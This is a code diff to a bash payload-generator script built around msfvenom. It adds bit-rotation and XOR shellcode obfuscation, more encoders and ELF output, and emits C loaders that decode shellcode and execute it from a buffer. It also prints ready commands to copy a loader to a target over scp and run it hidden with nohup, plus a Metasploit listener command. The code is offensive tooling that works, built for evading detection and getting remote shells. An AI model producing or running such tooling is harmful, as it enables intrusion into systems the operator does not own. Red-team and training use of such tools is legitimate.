@@ -18,7 +18,7 @@ LHOST=""
 LPORT=""
 RHOST=""
 VBA_OUTPUT=""
-RAW_OUTPUT_FILE="raw_shellcode.vba"
+RAW_OUTPUT_FILE="raw_shellcode.${FORMAT}"
 CLIPCMD=""
 INTERACTIVE_MODE=false
 ENCODER=""
@@ -29,6 +29,7 @@ OUTDIR="."
 FORCED_FORMAT=""
 DEBUG_MODE=false
 LOGFILE="debug_output.log"
+ROTATE_BITS=0
 
 # ====== PAYLOAD DEFINITIONS ======
 declare -A PAYLOADS=(
@@ -90,6 +91,7 @@ declare -A ENCODERS=(
     [8]="x86/fnstenv_mov"
     [9]="x64/xor"
     [10]="cmd/powershell_base64"
+    [11]="x64/zutto_dekiru"
 )
 
 
@@ -106,6 +108,12 @@ show_encoders() {
     for i in $(printf "%s\n" "${!ENCODERS[@]}" | sort -n); do
         echo "  $i) ${ENCODERS[$i]}"
     done
+}
+
+rotate_left() {
+    local byte=$1
+    local bits=$2
+    echo $(( ((byte << bits) | (byte >> (8 - bits))) & 0xFF ))
 }
 
 # ====== ARGUMENT PARSING ======
@@ -150,6 +158,12 @@ while [[ "$#" -gt 0 ]]; do
         --platform) PLATFORM="$2"; shift 2 ;;
         --format) FORCED_FORMAT="$2"; shift 2 ;;
         --outdir) OUTDIR="$2"; shift 2 ;;
+        --rotate)
+            ROTATE_BITS="$2"
+            [[ "$ROTATE_BITS" =~ ^[0-9]+$ ]] || { echo "[-] Invalid rotate value: $2"; exit 1; }
+            echo "[*] Bit rotation enabled: $ROTATE_BITS bits"
+            shift 2
+            ;;
         -i|--interactive) INTERACTIVE_MODE=true; shift ;;
         --debug) DEBUG_MODE=true; shift ;;
         -h|--help)
@@ -184,24 +198,16 @@ while [[ "$#" -gt 0 ]]; do
     esac
 done
 
+#  Ensure Only Either Rotate bits or Xor is used at a single time, until feature implemented in the future
+if [[ "$KEY" != "0x41" && "$ROTATE_BITS" -ne 0 ]]; then
+    echo "[-] Cannot use both XOR and rotate simultaneously. Use one or the other."
+    exit 1
+fi
+
+
 # Prompt if payload not set
 [[ -z "$PAYLOAD" ]] && { show_payloads; read -p "Select payload index: " PAYLOAD_INDEX; PAYLOAD="${PAYLOADS[$PAYLOAD_INDEX]}"; }
 
-# Prompt for encoder
-if [[ -z "$ENCODER" ]]; then
-    read -p "Would you like to use an encoder? (y/n): " enc_choice
-    if [[ "$enc_choice" =~ ^[Yy]$ ]]; then
-        show_encoders
-        read -p "Select encoder index: " ENCODER_INDEX
-        ENCODER="${ENCODERS[$ENCODER_INDEX]}"
-        if [[ -z "$ENCODER" ]]; then
-            echo "[-] Invalid encoder index"
-            exit 1
-        fi
-        read -p "Iterations (default: 1): " USER_ITER
-        [[ -n "$USER_ITER" ]] && ITERATIONS="$USER_ITER"
-    fi
-fi
 
 
 # === Validate ARCH compatibility if specified ===
@@ -264,20 +270,10 @@ done
 command -v msfvenom >/dev/null || { echo "[-] msfvenom not found"; exit 1; }
 
 # === Determine Output Format ===
-# === Restrict ELF-only payloads ===
-if [[ -n "${ELF_ONLY_PAYLOADS[$PAYLOAD_INDEX]}" ]]; then
-    if [[ "$FORMAT" != "exe" && "$FORMAT" != "elf" ]]; then
-        echo "[-] Payload '${PAYLOADS[$PAYLOAD_INDEX]}' only supports ELF/exe output."
-        echo "    You selected format '$FORMAT', which is not compatible."
-        echo "    Please use: --format exe (or elf if supported) or choose a different payload."
-        exit 1
-    fi
-fi
-
 if [[ -n "$FORCED_FORMAT" ]]; then
     FORMAT="$FORCED_FORMAT"
 
-    VALID_FORMATS=("exe" "vbapplication" "c")
+    VALID_FORMATS=("exe" "vbapplication" "c" "elf")
     if [[ ! " ${VALID_FORMATS[*]} " =~ " $FORMAT " ]]; then
         echo "[-] Invalid format specified: '$FORMAT'"
         echo "    Valid formats: ${VALID_FORMATS[*]}"
@@ -290,6 +286,43 @@ else
         *) FORMAT="exe" ;;
     esac
 fi
+
+# === Restrict ELF-only payloads ===
+if [[ -n "${ELF_ONLY_PAYLOADS[$PAYLOAD_INDEX]}" ]]; then
+    if [[ "$FORMAT" != "exe" && "$FORMAT" != "elf" ]]; then
+        echo "[-] Payload '${PAYLOADS[$PAYLOAD_INDEX]}' only supports ELF/exe output."
+        echo "    You selected format '$FORMAT', which is not compatible."
+        echo "    Please use: --format exe (or elf if supported) or choose a different payload."
+        exit 1
+    fi
+fi
+
+# Prompt for encoder
+# === Prompt for encoder ONLY IF applicable ===
+# Normalize and calculate XOR key
+KEY_DEC=$((KEY))
+
+if [[ -z "$ENCODER" ]]; then
+    if [[ "$PLATFORM" == "linux" && "$FORMAT" == "c" && ( "$KEY_DEC" -ne 0 || "$ROTATE_BITS" -ne 0 ) ]]; then
+        echo "[*] Skipping encoder prompt: custom encoding (XOR/rotate) applied to Linux shellcode payload."
+    else
+        read -p "Would you like to use an encoder? (y/n): " enc_choice
+        if [[ "$enc_choice" =~ ^[Yy]$ ]]; then
+            show_encoders
+            read -p "Select encoder index: " ENCODER_INDEX
+            ENCODER="${ENCODERS[$ENCODER_INDEX]}"
+            if [[ -z "$ENCODER" ]]; then
+                echo "[-] Invalid encoder index"
+                exit 1
+            fi
+            read -p "Iterations (default: 1): " USER_ITER
+            [[ -n "$USER_ITER" ]] && ITERATIONS="$USER_ITER"
+        fi
+    fi
+fi
+
+
+
 
 # === Clipboard Command ===
 if command -v xclip &>/dev/null; then
@@ -321,8 +354,13 @@ done
 
 # === File name ===
 mkdir -p "$OUTDIR"
-BASE_NAME="${PAYLOAD//\//_}"
-OUTFILE="$OUTDIR/$BASE_NAME.$FORMAT"
+if [[ -n "$VBA_OUTPUT" ]]; then
+    OUTFILE="$OUTDIR/$(basename "$VBA_OUTPUT")"
+else
+    BASE_NAME="${PAYLOAD//\//_}"
+    OUTFILE="$OUTDIR/$BASE_NAME.$FORMAT"
+fi
+
 KEY_DEC=$((KEY))
 KEY_HEX=$(printf "0x%02X" "$KEY_DEC")
 
@@ -341,7 +379,12 @@ case "$FORMAT" in
         fi
         echo "$raw" > "$OUTDIR/$RAW_OUTPUT_FILE" ;;
     c)
-      raw=$(msfvenom -p "$PAYLOAD" $VENOM_ARGS -f c) ;;
+      raw=$(msfvenom -p "$PAYLOAD" $VENOM_ARGS -f c) 
+      echo "$raw" > "$OUTDIR/$RAW_OUTPUT_FILE" ;;
+    elf)
+        msfvenom -p "$PAYLOAD" $VENOM_ARGS -f elf -o "$OUTFILE" || { echo "[-] msfvenom failed"; exit 1; }
+        echo "[+] Saved: $OUTFILE"
+        exit 0 ;;
     *)
         echo "[-] Unknown format: $FORMAT"
         exit 1 ;;
@@ -378,9 +421,20 @@ else
     encoded_array=()
     for byte in $shellcode; do
         hex="${byte:2}"
-        xor_val=$(( 0x$hex ^ KEY_DEC ))
-        encoded+="\\x$(printf "%02X" "$xor_val")"
-        encoded_array+=($xor_val)
+        dec_val=$((16#$hex))
+        
+        if [[ "$ROTATE_BITS" -gt 0 ]]; then
+            rot_val=$(rotate_left "$dec_val" "$ROTATE_BITS")
+            encoded+="\\x$(printf "%02X" "$rot_val")"
+            encoded_array+=($rot_val)
+        elif [[ "$KEY_DEC" -ne 0 ]]; then
+            xor_val=$(( dec_val ^ KEY_DEC ))
+            encoded+="\\x$(printf "%02X" "$xor_val")"
+            encoded_array+=($xor_val)
+        else
+            encoded+="\\x$hex"
+            encoded_array+=($dec_val)
+        fi
     done
 
     # For clipboard menu
@@ -432,30 +486,76 @@ elif [[ "$FORMAT" == "c" ]]; then
 
     C_OUTPUT_FILE="$CFILE"
 
-    cat > "$CFILE" <<EOF
+    if [[ "$ROTATE_BITS" -gt 0 ]]; then
+        cat > "$CFILE" <<EOF
 #include <stdio.h>
+#include <stdint.h>
+
+// Rotated buffer (left during encoding)
 unsigned char buf[] = "$encoded";
+
+// Rotate Right (to decode)
+unsigned char ror(unsigned char byte, int count) {
+    return ((byte >> count) | (byte << (8 - count))) & 0xFF;
+}
+
 int main() {
-    char key = $KEY_DEC;
-    for (int i = 0; i < sizeof(buf)-1; i++) buf[i] ^= key;
+    for (int i = 0; i < sizeof(buf) - 1; i++) {
+        buf[i] = ror(buf[i], $ROTATE_BITS);
+    }
+
     int (*ret)() = (int(*)())buf;
     ret();
 }
 EOF
+
+    elif [[ "$KEY_DEC" -ne 0 ]]; then
+        cat > "$CFILE" <<EOF
+#include <stdio.h>
+
+unsigned char buf[] = "$encoded";
+
+int main() {
+    char key = $KEY_DEC;
+    for (int i = 0; i < sizeof(buf) - 1; i++) {
+        buf[i] ^= key;
+    }
+
+    int (*ret)() = (int(*)())buf;
+    ret();
+}
+EOF
+
+    else
+        # No XOR or rotation applied
+        cat > "$CFILE" <<EOF
+#include <stdio.h>
+
+unsigned char buf[] = "$encoded";
+
+int main() {
+    int (*ret)() = (int(*)())buf;
+    ret();
+}
+EOF
+    fi
+
     echo "[+] C payload saved to $CFILE"
+
     [[ "$NO_SUGGEST" != true ]] && {
-        echo "[*] Suggested Compilation: ..."
-        echo ""
         echo "[*] Suggested Compilation:"
+        echo ""
         echo "    gcc $(basename "$CFILE") -o decode.out -z execstack"
         echo ""
         echo "[*] Suggested Remote Execution (example):"
         echo "    scp \"$CFILE\" <user>@<target-ip>:/tmp/"
-        echo "    ssh <user>@<target-ip> 'gcc /tmp/$(basename "$CFILE") -o /tmp/decode.out -z execstack && nohup ./decode.out >/dev/null 2>&1 &'"
+        echo "    ssh <user>@<target-ip> 'gcc /tmp/$(basename "$CFILE") -o /tmp/decode.out -z execstack && nohup /tmp/decode.out >/dev/null 2>&1 &'"
         echo ""
     }
+
     C_OUTPUT_FILE="$CFILE"
 fi
+
 
 # === Listener command ===
 MSF_COMMAND="msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD $PAYLOAD; "
@@ -501,8 +601,13 @@ interactive_menu() {
         fi
 
         if [[ "$FORMAT" == "vbapplication" || "$FORMAT" == "c" ]]; then
-            echo "$opt_num) Copy XOR bytes"
-            options+=("xor")
+            if [[ "$ROTATE_BITS" -gt 0 ]]; then
+                echo "$opt_num) Copy Rotated Bytes"
+                options+=("rotated")
+            else
+                echo "$opt_num) Copy XOR Bytes"
+                options+=("xor")
+            fi
             ((opt_num++))
         fi
 
@@ -559,6 +664,10 @@ interactive_menu() {
                         echo "[-] XOR-encoded data missing."
                     fi
                     ;;
+                rotated)
+                       echo "$encoded_csv" | $CLIPCMD
+                       echo "[+] Rotated shellcode copied." | tee -a "$LOGFILE"
+                       ;;
                 msf)
                     echo "$MSF_COMMAND" | $CLIPCMD
                     echo "[+] msfconsole command copied." | tee -a "$LOGFILE"
